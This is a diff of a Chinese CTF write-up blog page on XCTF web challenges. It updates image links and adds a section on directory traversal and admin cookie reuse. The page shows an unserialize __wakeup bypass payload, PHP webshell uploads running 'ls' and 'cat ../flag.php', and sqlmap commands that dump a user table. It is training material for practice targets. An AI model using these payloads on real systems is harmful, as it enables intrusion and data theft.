@@ -98,7 +98,7 @@
 			
 			
 				<i class="iconfont icon-words"></i>
-				<span class="words">2435
+				<span class="words">3594
 				</span>
 			
 		</div>
@@ -152,7 +152,7 @@
 <figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=%2561dmin</span><br></pre></td></tr></table></figure>
 
 <p>传入，经urldecode后即为”admin“</p>
-<p><img src="C:%5CUsers%5C%E8%B4%BE%E5%AF%85%E9%B9%8F%5CDesktop%5C%E7%BD%91%E5%AE%89demo%5Cwp%5Cadworld2%5C1.PNG" alt></p>
+<p><img src="https://i.postimg.cc/FHqJLgb4/1.png" alt></p>
 <h3 id="0x02-unserialize3"><a href="#0x02-unserialize3" class="headerlink" title="0x02 unserialize3"></a>0x02 unserialize3</h3><p>页面为一段php代码：</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure>
 
@@ -164,17 +164,17 @@
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"xctf"</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">"flag"</span>;s:<span class="number">3</span>:<span class="string">"111"</span>;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>即可绕过_wakeup()</p>
-<p><img src="C:%5CUsers%5C%E8%B4%BE%E5%AF%85%E9%B9%8F%5CDesktop%5C%E7%BD%91%E5%AE%89demo%5Cwp%5Cadworld2%5C2.PNG" alt></p>
+<p><img src="https://i.postimg.cc/zBwL6ssz/2.png" alt></p>
 <h3 id="0x03-upload1"><a href="#0x03-upload1" class="headerlink" title="0x03 upload1"></a>0x03 upload1</h3><p>一个文件上传页面，查看源代码发现前端有文件后缀的验证，只允许上传后缀为‘jpg’和‘png’的文件，使用bp抓包修改后缀绕过即可</p>
 <p>上传一个带有php代码的文件，后缀添加’.png‘，php代码：</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">"ls"</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>使用bp抓包修改后缀，放包</p>
-<p><img src="C:%5CUsers%5C%E8%B4%BE%E5%AF%85%E9%B9%8F%5CDesktop%5C%E7%BD%91%E5%AE%89demo%5Cwp%5Cadworld2%5C3.png" alt></p>
+<p><img src="https://i.postimg.cc/1X5zTf0B/3.png" alt></p>
 <p>可以看到上传成功，并且显示了文件所在的目录和文件名</p>
-<p><img src="C:%5CUsers%5C%E8%B4%BE%E5%AF%85%E9%B9%8F%5CDesktop%5C%E7%BD%91%E5%AE%89demo%5Cwp%5Cadworld2%5C4.PNG" alt></p>
+<p><img src="https://i.postimg.cc/sxVBrnzp/4.png" alt></p>
 <p>访问该文件，成功执行了php代码</p>
-<p><img src="/images/placeholder.png" alt data-src="C:%5CUsers%5C%E8%B4%BE%E5%AF%85%E9%B9%8F%5CDesktop%5C%E7%BD%91%E5%AE%89demo%5Cwp%5Cadworld2%5C5.PNG" class="lazyload"></p>
+<p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/v8zgzd7X/5.png" class="lazyload"></p>
 <p>继续上传，在bp抓包时修改php代码，查看其他文件，php代码：</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">"ls .."</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -182,29 +182,45 @@
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">"cat ../flag.php"</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>访问上传后的文件，查看源码即可获得flag</p>
-<p><img src="/images/placeholder.png" alt data-src="C:%5CUsers%5C%E8%B4%BE%E5%AF%85%E9%B9%8F%5CDesktop%5C%E7%BD%91%E5%AE%89demo%5Cwp%5Cadworld2%5C6.PNG" class="lazyload"></p>
+<p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/NFpKf1GZ/6.png" class="lazyload"></p>
 <h3 id="0x04-ics-04"><a href="#0x04-ics-04" class="headerlink" title="0x04 ics-04"></a>0x04 ics-04</h3><p>题目提示：工控云管理系统新添加的登录和注册页面存在漏洞，请找出flag。</p>
 <p>随便注册一个用户登陆，提示<strong>普通用户登录成功,没什么用</strong></p>
 <p>但发现可以用同一个用户名注册不同的密码且都可以登陆，考虑找出管理员的用户名注册新密码登陆</p>
 <p>在登陆和找回密码页面尝试注入，发现在找回密码页面，输入“sunsh1ne”回显密保问题为”123”即设置的问题，输入“sunsh1ne’ or 1=’1”回显密保问题为“cetc”，猜测存在sql注入</p>
 <p>使用bp抓包保存为test.txt再使用sqlmap跑一下</p>
-<p><img src="/images/placeholder.png" alt data-src="C:%5CUsers%5C%E8%B4%BE%E5%AF%85%E9%B9%8F%5CDesktop%5C%E7%BD%91%E5%AE%89demo%5Cwp%5Cadworld2%5C7.PNG" class="lazyload"></p>
+<p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/g2wxmXCB/7.png" class="lazyload"></p>
 <figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">sqlmap -r test.txt <span class="comment">--dbs</span></span><br></pre></td></tr></table></figure>
 
 <p>跑出了4个表</p>
-<p><img src="/images/placeholder.png" alt data-src="C:%5CUsers%5C%E8%B4%BE%E5%AF%85%E9%B9%8F%5CDesktop%5C%E7%BD%91%E5%AE%89demo%5Cwp%5Cadworld2%5C8.PNG" class="lazyload"></p>
+<p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/YqDv5fsW/8.png" class="lazyload"></p>
 <p>继续查询cetc004数据库中的表</p>
 <figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">sqlmap -r test.txt -D cetc004 <span class="comment">--tables</span></span><br></pre></td></tr></table></figure>
 
 <p>只有1个user表</p>
-<p><img src="/images/placeholder.png" alt data-src="C:%5CUsers%5C%E8%B4%BE%E5%AF%85%E9%B9%8F%5CDesktop%5C%E7%BD%91%E5%AE%89demo%5Cwp%5Cadworld2%5C9.PNG" class="lazyload"></p>
+<p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/CLxZr6m0/9.png" class="lazyload"></p>
 <p>查询user表中的数据</p>
 <figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sqlmap -r test.txt -D cetc004 -T<span class="built_in"> user </span>--dump</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/placeholder.png" alt data-src="C:%5CUsers%5C%E8%B4%BE%E5%AF%85%E9%B9%8F%5CDesktop%5C%E7%BD%91%E5%AE%89demo%5Cwp%5Cadworld2%5C10.PNG" class="lazyload"></p>
+<p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/LXVXNzPh/10.png" class="lazyload"></p>
 <p>密码为hash值，使用<strong>“username=c3tlwDmIn23”</strong>的用户名再注册一次，登陆即可获得flag</p>
-<p><img src="/images/placeholder.png" alt data-src="C:%5CUsers%5C%E8%B4%BE%E5%AF%85%E9%B9%8F%5CDesktop%5C%E7%BD%91%E5%AE%89demo%5Cwp%5Cadworld2%5C11.PNG" class="lazyload"></p>
-<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3>  	
+<p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/SxwJsQqQ/11.png" class="lazyload"></p>
+<h3 id="0x05-wtf-sh-150"><a href="#0x05-wtf-sh-150" class="headerlink" title="0x05 wtf.sh-150"></a>0x05 wtf.sh-150</h3><p>页面为一个论坛，注册一个用户登陆，可以发贴和回复，随便进入一个帖子，目录为</p>
+<p>“/post.wtf?post=K8laH”，测试发现“post”参数存在目录穿越漏洞</p>
+<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">/post.wtf</span>?post=<span class="string">../</span></span><br></pre></td></tr></table></figure>
+
+<p>源码泄露，搜索“flag”，得到有关代码</p>
+<p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/HxmnwSVf/12.png" class="lazyload"></p>
+<p>代码格式化：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"/css/std.css"</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">        $ if contains 'user' $&#123;!URL_PARAMS[@]&#125; &amp;&amp; file_exists "users/$&#123;URL_PARAMS['user']&#125;"</span><br><span class="line">        $ then</span><br><span class="line">        $   local username=$(head -n 1 users/$&#123;URL_PARAMS['user']&#125;);</span><br><span class="line">        $   echo "<span class="tag">&lt;<span class="name">h3</span>&gt;</span>$&#123;username&#125;'s posts:<span class="tag">&lt;/<span class="name">h3</span>&gt;</span>";</span><br><span class="line">        $   echo "<span class="tag">&lt;<span class="name">ol</span>&gt;</span>";</span><br><span class="line">        $   get_users_posts "$&#123;username&#125;" | while read -r post; do</span><br><span class="line">        $       post_slug=$(awk -F/ '&#123;print $2 "#" $3&#125;' &lt;&lt;&lt; "$&#123;post&#125;");</span><br><span class="line">        $       echo "<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">\</span>"/<span class="attr">post.wtf</span>?<span class="attr">post</span>=<span class="string">$&#123;post_slug&#125;\</span>"&gt;</span>$(nth_line 2 "$&#123;post&#125;" | htmlentities)<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>";</span><br><span class="line">        $   done </span><br><span class="line">        $   echo "<span class="tag">&lt;/<span class="name">ol</span>&gt;</span>";</span><br><span class="line">        $   if is_logged_in &amp;&amp; [[ "$&#123;COOKIES['USERNAME']&#125;" = 'admin' ]] &amp;&amp; [[ $&#123;username&#125; = 'admin' ]]</span><br><span class="line">        $   then</span><br><span class="line">        $       get_flag1</span><br><span class="line">        $   fi</span><br><span class="line">        $ fi</span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>关键代码：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">if is_logged_in &amp;&amp; [[ "$&#123;COOKIES['USERNAME']&#125;" = 'admin' ]] &amp;&amp; [[ $&#123;username&#125; = 'admin' ]]</span><br><span class="line">       $   then</span><br><span class="line">       $       get_flag1</span><br></pre></td></tr></table></figure>
+
+<p>即我们需要以admin用户登录即可获得flag1，源码中发现<strong>“users”</strong>目录，访问下</p>
+<p>获得了所有用户的用户名和cookie值</p>
+<p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/43VnhCN6/13.png" class="lazyload"></p>
+<p>重新登陆，使用bp抓包以admin用户登陆</p>
+  	
 					
 	  </div>     
 	  
